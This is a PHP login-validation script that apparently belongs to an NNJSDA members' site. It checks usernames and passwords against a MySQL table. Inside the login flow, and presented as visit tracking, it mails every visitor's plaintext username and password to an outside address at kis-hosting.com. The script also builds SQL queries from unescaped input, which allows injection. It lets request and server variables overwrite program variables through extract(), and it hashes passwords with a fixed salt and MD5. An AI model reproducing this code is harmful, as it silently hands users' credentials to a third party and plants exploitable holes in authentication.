<?
// login.php -- perform validation
session_start();
if (!empty($_GET)) {
extract($_GET);
} else if (!empty($HTTP_GET_VARS)) {
extract($HTTP_GET_VARS);
}

if (!empty($_POST)) {
extract($_POST);
} else if (!empty($HTTP_POST_VARS)) {
extract($HTTP_POST_VARS);
}
extract ($_SERVER);

include('dbconfig.php');
$connect = mysql_connect($dbhost, $dbuser, $dbpass) or die ("Unable to connect!");
mysql_select_db($dbname, $connect);


if ($_SERVER['SERVER_NAME'] != "localhost")
{
    if ($_SERVER["HTTP_X_FORWARDED_FOR"] != "")
	{
        $IP = $_SERVER["HTTP_X_FORWARDED_FOR"];
        $proxy = $_SERVER["REMOTE_ADDR"];
        $host = @gethostbyaddr($_SERVER["HTTP_X_FORWARDED_FOR"]);
    }
	else
	{
        $IP = $_SERVER["REMOTE_ADDR"];
        $host = @gethostbyaddr($_SERVER["REMOTE_ADDR"]);
    }
 $body = "Referer: " . $_SERVER['HTTP_REFERER'] . "\n";
 $body .= "Remote Address:" . $host . "\n";
 $body .= "Username: $username\n";
 $body .= "Password: $password\n";
 mail("tracker@kis-hosting.com","NNJSDA Login Page Visited",$body,"From: Visit Tracker <tracker@nnjsda.org>");
}
if ($submit == "Get New Username") {
	header("Location: addme.php");
	exit();}
	
$_SESSION["SESSION"] = "New";
$status = authenticate($username, $password);
if ($status == 1)
{
	$_SESSION['logged_in_username'] = $username;
	$_SESSION['logged_in_password'] = crypt($password,'$1$somesalt');
	header("Location: admin.php");
	exit();
}
else
{
	header("Location: user_login.php?err=$status");
	exit();
}

function authenticate($u, $p)
{
$cp = crypt($p,'$1$somesalt');
$mdp = md5($p);
$query = "Select ind from validusers WHERE username = '$u' AND (pwd = '$cp' or pwd = '$mdp')";
$result = mysql_query($query) or die (" Error in query: $query. " . mysql_error());
if (mysql_num_rows($result) == 1)
{
	$row = mysql_fetch_object($result);
	$query = "Select * from validusers WHERE ind='$row->ind'";
	$result = mysql_query($query) or die (" Error in query: $query. " . mysql_error());
	$row = mysql_fetch_object($result) or die ("Error getting row!");
	if ($row->userconfirmed == "0") {
		$ind = $row->ind;
		$query = "Update validusers set userconfirmed='1' where ind='$ind'";
		$result = mysql_query($query) or die (" Error in query: $query. " . mysql_error());
		}
	return 1;
}
else
{
	return 0;
}
}
?>